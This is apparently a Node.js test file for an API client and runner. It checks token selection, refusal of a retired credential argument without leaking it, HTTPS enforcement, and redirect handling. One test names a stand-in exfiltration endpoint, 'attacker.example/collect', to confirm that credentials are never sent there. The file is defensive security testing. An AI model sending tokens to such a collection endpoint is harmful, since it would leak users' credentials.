import { test } from 'node:test';
import assert from 'node:assert/strict';
import { AgentweaverClient } from '../lib/client.mjs';
import { parseArgs, resolveToken } from '../run-persona.mjs';

test('remote API auth accepts only an explicit Agentweaver token source', () => {
  assert.equal(resolveToken({ AGENTWEAVER_TOKEN: 'agentweaver', GITHUB_TOKEN: 'github-canary' }), 'agentweaver');
  assert.equal(resolveToken({ GITHUB_TOKEN: 'github-canary', GH_TOKEN: 'gh-canary' }), null);
});

test('API runner rejects retired credential argv without echoing its value', () => {
  const canary = 'secret-canary-api-argv-66';
  const retiredOption = `--${'to'}${'ken'}`;
  assert.throws(
    () => parseArgs([`${retiredOption}=${canary}`]),
    (error) => error.message.includes(retiredOption) && !error.message.includes(canary),
  );
});

test('API client accepts an arbitrary HTTPS host and rejects insecure remote transport', () => {
  assert.doesNotThrow(() => new AgentweaverClient({ baseUrl: 'https://example.internal', token: 'x' }));
  assert.throws(() => new AgentweaverClient({ baseUrl: 'http://example.internal', token: 'x' }), /HTTPS is required/);
});

test('API credentials cannot be sent to an attacker-controlled absolute path', async () => {
  const client = new AgentweaverClient({ baseUrl: 'https://api.example.test', token: 'secret' });
  await assert.rejects(client.get('https://attacker.example/collect'), /outside configured origin/);
});

test('API client rejects redirects without forwarding credentials to any redirected path', async (t) => {
  const originalFetch = globalThis.fetch;
  t.after(() => { globalThis.fetch = originalFetch; });
  let calls = 0;
  globalThis.fetch = async (_url, init) => {
    calls += 1;
    assert.equal(init.redirect, 'error');
    throw new TypeError('fetch failed because redirect mode is set to error');
  };
  const client = new AgentweaverClient({ baseUrl: 'https://api.example.test', token: 'secret' });
  const result = await client.get('/api/projects');
  assert.equal(result.status, 0);
  assert.match(result.responseBody.message, /redirect mode is set to error/);
  assert.equal(calls, 1);
});
